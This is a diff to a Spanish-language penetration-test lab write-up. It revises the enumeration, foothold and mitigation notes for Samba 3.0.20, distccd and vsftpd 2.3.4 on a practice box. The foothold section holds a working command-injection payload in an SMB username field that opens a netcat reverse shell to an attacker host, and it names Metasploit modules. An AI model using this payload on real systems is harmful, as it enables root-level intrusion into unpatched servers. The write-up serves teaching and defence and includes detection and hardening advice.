@@ -34,7 +34,10 @@ nmap -p- -sCV <IP> -oN nmap.txt
 
 ## Enumeración
 
-- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».
+- **139/445 Samba 3.0.20-Debian**: `smbclient -L //<IP> -N` lista `tmp`, `opt`, `IPC$`, `print$`; `smbmap` confirma escritura anónima en `tmp`.
+- **21 vsftpd 2.3.4**: login anónimo permitido, directorio vacío. La versión está en el rango del backdoor, pero **no** responde en el 6200.
+- **3632 distccd 1**: compilador distribuido sin autenticación, ejecuta lo que le mandes como `daemon`.
+- La versión de Samba aparece distinta en 139 (`3.X - 4.X`) y en 445 (`3.0.20-Debian`): hay que casar la CVE con el banner bueno, no con el genérico.
 
 ## Foothold
 
@@ -42,18 +45,16 @@ nmap -p- -sCV <IP> -oN nmap.txt
 
 ```bash
 # el usuario se interpola en un script de shell sin sanear
-smbclient //<IP>/tmp -N -U '=/=`nohup nc -e /bin/sh <LHOST> 4444`'
+smbclient //<IP>/tmp -N -U '/=`nohup nc -e /bin/sh <LHOST> 4444`'
 ```
+
+El nombre de usuario viaja entre comillas dobles en la línea de órdenes y se ejecuta con backticks antes de autenticar: por eso la sesión vuelve como `uid=0`. Si el cliente moderno rechaza el dialecto, forzar `-m SMB2` o usar `exploit/multi/samba/usermap_script`.
 
 Alternativa con Metasploit: `exploit/multi/samba/usermap_script`.
 
-**distcc (CVE-2004-2687)** — ejecución como `daemon`:
+**distcc (CVE-2004-2687)** — ejecución como `daemon`, sin credenciales. Funciona con el módulo `exploit/unix/misc/distcc_exec`, pero algunas sesiones lo encuentran parcheado: conviene probarlo y no dar por hecho que es la vía.
 
-```bash
-# módulo: exploit/unix/misc/distcc_exec
-```
-
-**`vsftpd 2.3.4`** — el backdoor del `:)` es un clásico, pero en esta caja el puerto 6200 no responde de forma fiable: es un señuelo.
+**`vsftpd 2.3.4`** — el backdoor del `:)` (**CVE-2011-2523**) sólo existe en la build subida entre el 30/06 y el 03/07 de 2011. Aquí la versión es la correcta pero el implante **no está**: enviar `:)` como usuario no abre el 6200. No es un señuelo deliberado, es una versión sin el backdoor.
 
 ## Movimiento lateral
 
@@ -86,10 +87,11 @@ id; uname -a; ls -la /home; find / -perm -4000 -type f 2>/dev/null
 
 ## Mitigaciones y detección
 
-- Firmar SMB, deshabilitar SMBv1 y limitar los shares administrativos por grupo.
-- Detección: 5140/5145 anómalos y 4624 tipo 3 con NTLM desde hosts no administrativos.
-- Deshabilitar el FTP anónimo y sustituirlo por SFTP/FTPS con cuentas nominales.
-- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
+- Samba actualizado (el fallo es de 2007), `username map script` fuera de `smb.conf` y `smbd` sin privilegios de root.
+- `distccd` nunca en una interfaz de usuario: escucha sin autenticación y ejecuta compilaciones arbitrarias.
+- FTP anónimo cerrado y `vsftpd` en una build verificada por hash, no por banner.
+- Detección: logins SMB con nombres de usuario que contienen metacaracteres de shell, y procesos `nc`/`sh` hijos de `smbd`.
+- MITRE: T1190, T1210, T1548.
 
 ## Referencias
 
